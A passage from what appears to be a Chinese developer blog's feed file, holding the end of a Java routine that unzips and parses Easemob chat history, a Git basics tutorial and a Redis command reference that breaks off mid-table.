class="keyword">while</span> ((num = gzin.read(buf,<span class="number">0</span>,buf.length)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                fout.write(buf,<span class="number">0</span>,num);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;解压完成&quot;</span>);</span><br><span class="line">            <span class="comment">//解析json字符串文件，ouputfile为文件路径</span></span><br><span class="line">            getHistoryMessages(ouputfile);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line">            System.out.println(ex.toString());</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (gzin != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    gzin.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (fout != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    fout.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (fin != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    fin.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将解压后的文件内容转换为字符串(json格式字符串)，并解析json字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getHistoryMessages</span><span class="params">(String fileName)</span></span>&#123;</span><br><span class="line">        InputStream inputStream = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = <span class="keyword">new</span> FileInputStream(fileName);</span><br><span class="line">            String msg = getStreamToStr(inputStream);</span><br><span class="line">            System.out.println(<span class="string">&quot;解压后的消息字符串：&quot;</span>+msg);</span><br><span class="line">            <span class="comment">//字符串替换</span></span><br><span class="line">            String str1 = msg.replace(<span class="string">&quot;&#123;\&quot;chat_type\&quot;&quot;</span>,<span class="string">&quot; &#123;\&quot;chat_type\&quot;&quot;</span>);</span><br><span class="line">            <span class="comment">//去除前后两端的空格</span></span><br><span class="line">            String str2 = str1.trim();</span><br><span class="line">            <span class="comment">//字符串分割</span></span><br><span class="line">            String[] strings = str2.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">//将json格式字符串转化为对象</span></span><br><span class="line">            List&lt;ChatMessageHistory&gt; chatMessageHistoryList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strings.length; i++) &#123;</span><br><span class="line">                ChatMessageHistory chatMessageHistory = JSON.parseObject(strings[i],ChatMessageHistory.class);</span><br><span class="line">                chatMessageHistoryList.add(chatMessageHistory);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chatMessageHistoryList.size(); i++) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;第&quot;</span>+(i+<span class="number">1</span>)+<span class="string">&quot;条消息：&quot;</span>+chatMessageHistoryList.get(i).getPayload().getBodies().get(<span class="number">0</span>).getMsg());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//关闭字节输入流</span></span><br><span class="line">            <span class="keyword">if</span> (inputStream != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inputStream.close();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将一个字节输入流转化为字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tInputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStreamToStr</span><span class="params">(InputStream tInputStream)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tInputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">            InputStreamReader inputStreamReader = <span class="keyword">null</span>;</span><br><span class="line">            BufferedReader tBufferedReader = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//将字节输入流转换为字符输入流</span></span><br><span class="line">                inputStreamReader = <span class="keyword">new</span> InputStreamReader(tInputStream);</span><br><span class="line">                <span class="comment">//赋予字符流对象缓冲区</span></span><br><span class="line">                tBufferedReader = <span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">                StringBuffer tStringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">                String sTempOneLine;</span><br><span class="line">                <span class="keyword">while</span> ((sTempOneLine = tBufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    tStringBuffer.append(sTempOneLine);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> tStringBuffer.toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (inputStreamReader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        inputStreamReader.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (tBufferedReader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        tBufferedReader.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>（<strong>注意：</strong>#{Orgname}、#{Appname}、#{token}是变量，替换成自己的即可）</p><p>（<strong>注意：</strong>InputStream字节输入流是不能复用的，具体知识自行百度补充）</p>]]></content>
      
      
      <categories>
          
          <category> 环信集成 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 环信集成 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git的基本使用</title>
      <link href="2021/04/21/Git%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>2021/04/21/Git%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Git的基本使用"><a href="#Git的基本使用" class="headerlink" title="Git的基本使用"></a>Git的基本使用</h1><h2 id="1-Git基本信息设置"><a href="#1-Git基本信息设置" class="headerlink" title="1.Git基本信息设置"></a>1.Git基本信息设置</h2><ol><li><p>设置用户名</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&#x27;填写自己的GitHub用户名&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>设置用户邮箱</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.email <span class="string">&#x27;填写自己的邮箱&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="2-Git本地仓库提交代码到GitHub远程仓库"><a href="#2-Git本地仓库提交代码到GitHub远程仓库" class="headerlink" title="2.Git本地仓库提交代码到GitHub远程仓库"></a>2.Git本地仓库提交代码到GitHub远程仓库</h2><ol><li><p>初始化Git本地仓库（在项目文件夹内使用git init命令初始化git仓库，会自动生成一个.git文件夹）</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure></li><li><p>将初始化后的本地git仓库与GitHub上的远程仓库进行关联，关联后可将本地仓库代码提交到远程仓库进行版本管理(SSH地址关联，需要先设置SSH秘钥)</p>   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:[自己的GitHub用户名]/[GitHub上创建的仓库名].git</span><br></pre></td></tr></table></figure><p>   查看关联的远程仓库</p>   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure><p>   删除关联的远程仓库</p>   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote rm origin</span><br></pre></td></tr></table></figure></li><li><p>查看本地仓库的状态，查看本地仓库有没有文件（不是查看文件夹里是否有文件）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure></li><li><p>切换提交的分支</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b master <span class="comment"># 切换到master分支，</span></span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"><span class="comment"># 如果不是，后面的所有设置的分支记得保持一致</span></span><br></pre></td></tr></table></figure></li><li><p>提交文件到缓存区</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add 要提交的文件名 <span class="comment">#如果要提交仓库中所有的文件，则使用 git add .</span></span><br></pre></td></tr></table></figure></li><li><p>将缓存区的文件提交到本地仓库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;提交时的描述，比如此次提交做了什么修改等&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>将提交到本地仓库的文件项目提交到关联的GitHub远程仓库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin main</span><br></pre></td></tr></table></figure></li><li><p>如果提交远程仓库时报错，远程仓库和本地仓库有冲突时，先合并仓库在提交</p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull --rebase origin main</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-git命令回退方法"><a href="#3-git命令回退方法" class="headerlink" title="3.git命令回退方法"></a>3.git命令回退方法</h2><p>我们在使用git命令的时候，有时候误输入命令，导致需要回退到之前的状态。现在针对这种情况做一个汇总：</p><ol><li><p>Git add回退</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git status <span class="comment">#先看一下add中的文件，确定已经添加的文件。</span></span><br><span class="line"></span><br><span class="line">git reset HEAD <span class="comment">#如果后面什么都不跟的话，就是add已添加的全部撤销。</span></span><br><span class="line"></span><br><span class="line">git reset HEAD xxx.cpp <span class="comment">#只撤销所列出的文件。</span></span><br></pre></td></tr></table></figure></li><li><p>Git commit回退</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --soft HEAD^ </span><br><span class="line"><span class="comment">#这样就成功的撤销了你的commit。</span></span><br><span class="line"><span class="comment">#注意，仅仅是撤回commit操作，您写的代码仍然保留。</span></span><br></pre></td></tr></table></figure></li><li><p>Git review回退</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout [分支名] <span class="comment">#切换到需要回退的分支</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment">#查看提交记录</span></span><br><span class="line">git reset --hard <span class="comment">#代码回退</span></span><br><span class="line">git reset --hard [commit id] <span class="comment">#复制最近提交的上一条提交记录的commit id</span></span><br><span class="line">git review <span class="comment">#重新提交修改</span></span><br></pre></td></tr></table></figure></li><li><p>Git rebase回退</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reflog <span class="comment">#先查看本地提交操作编号。</span></span><br><span class="line"><span class="comment">#找到提交前的项目编号，例如4c173eb HEAD@&#123;3&#125;: commit: scan ，执行：</span></span><br><span class="line">git reset --hard 4c173eb</span><br></pre></td></tr></table></figure></li><li><p>Git cherry-pick回退</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git cherry-pick --abort.</span><br></pre></td></tr></table></figure></li></ol><div class="note info no-icon flat"><wavy>HEAD^</wavy> ：意思是上一个版本，也可以写成HEAD~1，如果你进行了2次commit，想都撤回，可以使用HEAD~2；</br><wavy>--mixed</wavy>：不删除工作空间改动代码，撤销commit，并且撤销git add . 操作，这个为默认参数：git reset --mixed HEAD^ 和 git reset HEAD^ 效果是一样的；</br><wavy>--soft</wavy>：不删除工作空间改动代码，撤销commit，不撤销git add . ；</br><wavy>--hard</wavy>：删除工作空间改动代码，撤销commit，撤销git add . ；</br><wavy>顺便说一下，如果commit注释写错了，只是想改一下注释，只需要： git commit --amend ；</wavy></div>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis基础命令</title>
      <link href="2021/03/17/redis%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>2021/03/17/redis%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="Redis数据存储格式："><a href="#Redis数据存储格式：" class="headerlink" title="Redis数据存储格式："></a>Redis数据存储格式：</h3><div class="note blue no-icon flat"><p>Redis自身是一个Map，其中所有的数据都是采用key：value的形式存储。</p></div><h3 id="Redis常用命令："><a href="#Redis常用命令：" class="headerlink" title="Redis常用命令："></a>Redis常用命令：</h3><div class="table-container"><table><thead><tr><th style="text-align:center">功能</th><th style="text-align:center">命令</th><th style="text-align:center">范例</th></tr></thead><tbody><tr><td style="text-align:center">设置数据</td><td style="text-align:center">set key value</td><td style="text-align:center">set name Tom</td></tr><tr><td style="text-align:center">获取数据</td><td style="text-align:center">get key</td><td style="text-align:center">get name</td></tr><tr><td style="text-align:center">清屏</td><td style="text-align:center">clear</td><td style="text-align:center">clear</td></tr><tr><td style="text-align:center">获取帮助</td><td style="text-align:center">help</td><td style="text-align:center">help</td></tr><tr><td style="text-align:center">退出</td><td style="text-align:center">quit/exit</td><td style="text-align:center">quit/exit</td></tr></tbody></table></div><h3 id="Redis数据类型-5种-："><a href="#Redis数据类型-5种-：" class="headerlink" title="Redis数据类型(5种)："></a>Redis数据类型(5种)：</h3><h4 id="string类型数据的基础操作："><a href="#string类型数据的基础操作：" class="headerlink" title="string类型数据的基础操作："></a>string类型数据的基础操作：</h4><ul><li><strong>添加/修改数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">单个数据</th><th style="text-align:center">多个数据</th></tr></thead><tbody><tr><td style="text-align:center">set key value</td><td style="text-align:center">mset key1 value1 key2 value2 …</td></tr></tbody></table></div><ul><li><strong>获取数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">单个数据</th><th style="text-align:center">多个数据</th></tr></thead><tbody><tr><td style="text-align:center">get key</td><td style="text-align:center">mget key1 key2 …</td></tr></tbody></table></div><ul><li><strong>删除数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del key</span><br></pre></td></tr></table></figure><ul><li><strong>获取数据字符个数（字符串长度）</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strlen key</span><br></pre></td></tr></table></figure><ul><li><strong>追加信息到原始信息后部（如果原始信息存在就追加，否则新建）</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">append key value</span><br></pre></td></tr></table></figure><h4 id="string类型数据的扩展操作："><a href="#string类型数据的扩展操作：" class="headerlink" title="string类型数据的扩展操作："></a>string类型数据的扩展操作：</h4><h5 id="数据库分表场景："><a href="#数据库分表场景：" class="headerlink" title="数据库分表场景："></a>数据库分表场景：</h5><ul><li><strong>设置数值数据增加指定范围的值</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">范例(num初始值为”1”)</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">incr key</td><td style="text-align:center">incr num</td><td style="text-align:center">num=”2”</td></tr><tr><td style="text-align:center">incrby key increment</td><td style="text-align:center">incrby num 10</td><td style="text-align:center">num=”12”</td></tr><tr><td style="text-align:center">incrbyfloat key increment</td><td style="text-align:center">incrbyfloat num 1.5</td><td style="text-align:center">num=”13.5”</td></tr></tbody></table></div><ul><li><strong>设置数值数据减少指定范围的值</strong></li></ul><div class="table-container"><table><thead><tr><th>命令</th><th>范例(num初始值为”15”)</th><th>结果</th></tr></thead><tbody><tr><td>decr key</td><td>decr num</td><td>num=”14”</td></tr><tr><td>decrby key increment</td><td>decrby num 10</td><td>num=”4”</td></tr></tbody></table></div><div class="note green no-icon flat"><ul><li>string在Redis内部存储默认是一个字符串，当遇到增减类操作incr、decr时会转成数值类型进行计算。</li><li>Redis所有的操作都是原子性的，采用单线程处理所有业务，命令是一个一个执行的，因此无需考虑并发带来的数据影响。</li><li>注意：按数值进行操作的数据，如果原始数据不能转成数值，或超越了Redis数值上限范围将报错。9223372036854775807（java中Long型数据最大值，Long.MAX_VALUE）</li></ul><h6 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h6><ul><li>Redis用于控制数据库表主键id，为数据库表主键提供生成策略，保障数据库表的主键唯一性。</li><li>此方案适用于所有数据库，且支持数据库集群。</li></ul></div><h5 id="设置数据生命周期："><a href="#设置数据生命周期：" class="headerlink" title="设置数据生命周期："></a>设置数据生命周期：</h5><ul><li><strong>设置数据具有制定的生命周期</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">范例</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">setex key seconds value</td><td style="text-align:center">setex  num 10 Tom</td><td style="text-align:center">10秒后数据消失</td></tr><tr><td style="text-align:center">psetex key milliseconds value</td><td style="text-align:center">psetex num 1000 Tom</td><td style="text-align:center">1000毫秒后数据消失</td></tr></tbody></table></div><h6 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h6><ul><li>Redis控制数据的生命周期，通过数据是否失效控制业务行为，适用于所有具有时效性限定控制的操作。</li></ul><h5 id="string类型数据操作的注意事项："><a href="#string类型数据操作的注意事项：" class="headerlink" title="string类型数据操作的注意事项："></a>string类型数据操作的注意事项：</h5><p>数据操作不成功的反馈与数据正常操作之间的差异</p><p>①表示运行结果是否成功</p><ul><li><p>（integer）0 —&gt; false 失败</p></li><li><p>（integer）1 —&gt; true 成功</p></li></ul><p>②表示运行结果</p><ul><li><p>（integer）3 —&gt; 3 3个</p></li><li><p>（integer）1 —&gt; 1 1个</p></li><li><p>数据未获取到</p><p>（nil）等同于null</p></li><li><p>数据最大存储量</p><p>512MB</p></li><li><p>数值计算最大范围(java中long的最大值)</p><p>±9223372036854775807</p></li></ul><h5 id="key的设置约定"><a href="#key的设置约定" class="headerlink" title="key的设置约定"></a>key的设置约定</h5><p>表名 ：主键名 ：主键值 ： 字段名</p><hr><h4 id="hash类型数据的基础操作："><a href="#hash类型数据的基础操作：" class="headerlink" title="hash类型数据的基础操作："></a>hash类型数据的基础操作：</h4><ul><li><strong>添加/修改数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">单个数据操作</th><th style="text-align:center">多个数据操作</th></tr></thead><tbody><tr><td style="text-align:center">hset key field value</td><td style="text-align:center">hmset key field1 value1 field2 value2…</td></tr></tbody></table></div><ul><li><strong>获取数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">单个数据操作</th><th style="text-align:center">多个数据操作</th></tr></thead><tbody><tr><td style="text-align:center">hget key field</td><td style="text-align:center">hmget key field1 field2 …</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">hgetall key</td></tr></tbody></table></div><ul><li><strong>删除数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hdel key field1 [field2]</span><br></pre></td></tr></table></figure><ul><li><strong>获取哈希表中字段的数量</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hlen key</span><br></pre></td></tr></table></figure><ul><li><strong>获取哈希表中是否存在指定的字段</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexists key field</span><br></pre></td></tr></table></figure><h4 id="hash类型数据扩展操作"><a href="#hash类型数据扩展操作" class="headerlink" title="hash类型数据扩展操作"></a>hash类型数据扩展操作</h4><ul><li>获取哈希表中所有的字段名或字段值</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th></th></tr></thead><tbody><tr><td style="text-align:center">hkeys key</td><td></td></tr><tr><td style="text-align:center">hvals key</td></tr></tbody></table></div><ul><li><strong>设置指定字段的数值数据增加指定范围的值</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th></th></tr></thead><tbody><tr><td style="text-align:center">hincrby key field increment</td><td></td></tr><tr><td style="text-align:center">hincrbyfloat key field increment</td></tr></tbody></table></div><h5 id="hash类型数据操作注意事项"><a href="#hash类型数据操作注意事项" class="headerlink" title="hash类型数据操作注意事项"></a>hash类型数据操作注意事项</h5><ul><li><p>hash类型下的value只能存储字符串，不允许存储其他数据类型，不存在嵌套现象。如果未获取到数据，对应值为(nil)</p></li><li><p>每个hash可以存储2^32-1</p></li><li><p>hash类型十分贴近对象的数据存储形式，并且可以灵活添加删除对象属性。但hash设计初衷不是为了存储大量对象而设计的，切记不可滥用，更不可将hash作为对象列表使用。</p></li><li><p>hgetall操作可以获取全部属性，如果内部field过多，遍历整体数据效率就会很低，有可能成为数据访问瓶颈。</p><h4 id="hash类型应用场景"><a href="#hash类型应用场景" class="headerlink" title="hash类型应用场景"></a>hash类型应用场景</h4><h5 id="购物车订单场景"><a href="#购物车订单场景" class="headerlink" title="购物车订单场景"></a>购物车订单场景</h5><p>以客户id作为key，每位客户创建一个hash存储结构对象。</p><p>将商品编号作为field，购买数量作为value进行存储。</p><p>设一个新的key,将所有商品基本信息独立存储在一个hash。</p><p>将商品编号作为field，商品信息的json数据作为value进行存储。</p><p>添加商品：追加全新的field与value</p><p>浏览：遍历hash</p><p>更改数据：自增/自减，设置value值</p><p>删除商品：删除field</p><p>清空：删除key</p></li></ul><ul><li><p><strong>如果当前对应的key中的field有值就什么都不做，如果没有值就添加</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hsetnx key field value</span><br></pre></td></tr></table></figure><hr></li></ul><h4 id="list类型数据的基础操作："><a href="#list类型数据的基础操作：" class="headerlink" title="list类型数据的基础操作："></a>list类型数据的基础操作：</h4><p>数据存储需求：存储多个数据，并对数据进入存储空间的顺序进行区分。</p><p>需要的存储结构：一个存储空间保存多个数据，且通过数据可以提现进入顺序。</p><p>list类型：保存多个数据，底层使用双向链表存储结构实现。</p><ul><li><p><strong>添加/修改数据</strong></p><p>|             命令             |<br>| :—————————————: |<br>| lpush key value1 [value2] …… |<br>| rpush key value1 [value2] …… |</p></li></ul><ul><li><strong>获取数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">lrange key start stop</td></tr><tr><td style="text-align:center">lindex key index</td></tr><tr><td style="text-align:center">llen key</td></tr></tbody></table></div><ul><li><strong>获取并移除数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">lpop key</td></tr><tr><td style="text-align:center">rpop key</td></tr></tbody></table></div><h4 id="list类型数据扩展操作"><a href="#list类型数据扩展操作" class="headerlink" title="list类型数据扩展操作"></a>list类型数据扩展操作</h4><ul><li><strong>规定时间内获取并移除数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">blpop key1 [key2] timeout</td></tr><tr><td style="text-align:center">brpop key1 [key2] timeout</td></tr></tbody></table></div><ul><li><strong>移除指定数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lrem key count value</span><br></pre></td></tr></table></figure><hr><h4 id="set类型数据的基础操作："><a href="#set类型数据的基础操作：" class="headerlink" title="set类型数据的基础操作："></a>set类型数据的基础操作：</h4><ul><li><strong>添加数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sadd key member1 [member2]</span><br></pre></td></tr></table></figure><ul><li><strong>获取全部数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smembers key</span><br></pre></td></tr></table></figure><ul><li><strong>删除数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srem key member1 [member2]</span><br></pre></td></tr></table></figure><ul><li><strong>获取集合数据总量</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scard key</span><br></pre></td></tr></table></figure><ul><li><strong>判断集合中是否包含指定数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sismember key member</span><br></pre></td></tr></table></figure><h4 id="set类型数据的扩展操作"><a href="#set类型数据的扩展操作" class="headerlink" title="set类型数据的扩展操作"></a>set类型数据的扩展操作</h4><h5 id="根据用户兴趣爱好推荐场景（操作随机数据）"><a href="#根据用户兴趣爱好推荐场景（操作随机数据）" class="headerlink" title="根据用户兴趣爱好推荐场景（操作随机数据）"></a>根据用户兴趣爱好推荐场景（操作随机数据）</h5><ul><li><strong>随机获取集合中指定数量的数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srandmember key [count]</span><br></pre></td></tr></table></figure><ul><li><strong>随机获取集合中的某个数据并将该数据移出集合</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spop key</span><br></pre></td></tr></table></figure><h5 id="set数据交并差操作"><a href="#set数据交并差操作" class="headerlink" title="set数据交并差操作"></a>set数据交并差操作</h5><ul><li><strong>求两个集合的交、并、差集</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">操作名称</th><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">交集</td><td style="text-align:center">sinter key1 [key2]</td></tr><tr><td style="text-align:center">并集</td><td style="text-align:center">sunion key1 [key2]</td></tr><tr><td style="text-align:center">差集</td><td style="text-align:center">sdiff key1 [key2]</td></tr></tbody></table></div><ul><li><strong>求两个集合的交、并、差集并存储到指定集合中</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">操作名称</th><th style="text-align:center">命令</th><th style="text-align:center">范例</th></tr></thead><tbody><tr><td style="text-align:center">key1与key2的交集存储到destination指定的集合中</td><td style="text-align:center">sinterstore destination key1 [key2]</td><td style="text-align:center">sinterstore u3 u1 u2</td></tr><tr><td style="text-align:center">key1与key2的并集存储到destination指定的集合中</td><td style="text-align:center">sunionstore destination key1 [key2]</td><td style="text-align:center">sunionstore u3 u1 u2</td></tr><tr><td style="text-align:center">key1与key2的差集存储到destination指定的集合中</td><td style="text-align:center">sdiffstore destination key1 [key2]</td><td style="text-align:center">sdiffstore u3 u1 u2</td></tr></tbody></table></div><ul><li><strong>将指定数据从原始集合中移动到目标集合中</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smove source destination  member</span><br></pre></td></tr></table></figure><ul><li><strong>Tips:</strong><ul><li>redis 应用于同类信息的关联搜索，二度关联搜索，深度关联搜索。</li><li>显示共同关注（一度）</li><li>显示共同好友（一度）</li><li>由用户A出发，获取到好友用户B的好友信息列表（一度）</li><li>由用户A出发，获取到好友用户B的购物清单列表（二度）</li><li>由用户A出发，获取到好友用户B的游戏充值列表（二度）</li></ul></li></ul><h5 id="set类型数据操作的注意事项"><a href="#set类型数据操作的注意事项" class="headerlink" title="set类型数据操作的注意事项"></a>set类型数据操作的注意事项</h5><ul><li><p>set类型不允许数据重复，如果添加的数据在set中已经存在，将只保留一份</p></li><li><p>set虽然与hash的存储结构相同，但是无法启用hash中存储值的空间</p></li></ul><hr><h4 id="sorted-set类型数据的基础操作："><a href="#sorted-set类型数据的基础操作：" class="headerlink" title="sorted_set类型数据的基础操作："></a>sorted_set类型数据的基础操作：</h4><p>新的存储需求：数据排序有利于数据的有效展示，需要提供一种可以根据自身特征进行排序的方式</p><p>需要的存储结构：新的存储模型，可以保存可排序的数据</p><p>sorted_set类型：在set的存储结构基础上添加可排序字段</p><ul><li><strong>添加数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zadd key score1 member1 [score2 member2]</span><br></pre></td></tr></table></figure><ul><li><strong>获取全部数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">获取顺序</th></tr></thead><tbody><tr><td style="text-align:center">zrange key start stop [WITHSCORES]</td><td style="text-align:center">升序</td></tr><tr><td style="text-align:center">zrevrange key start stop [WITHSCORES]</td><td style="text-align:center">降序</td></tr></tbody></table></div><ul><li><strong>删除数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zrem key member [member ...]</span><br></pre></td></tr></table></figure><ul><li><strong>按条件获取数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">获取顺序</th><th style="text-align:center">范例</th></tr></thead><tbody><tr><td style="text-align:center">zrangebyscore key min max [WITHSCORES] [LIMIT]</td><td style="text-align:center">升序</td><td style="text-align:center">zrangebyscore u1 50 80 withscores 或zrangebyscore u1 50 80 limit 0 3 withscores</td></tr><tr><td style="text-align:center">zrevrangebyscore key max min [WITHSCORES]</td><td style="text-align:center">降序</td><td style="text-align:center">zrevrangebyscore u1 80 50 withscores</td></tr></tbody></table></div><ul><li><strong>按条件删除数据</strong></li></ul><div class="table-container"><table><thead><tr><th 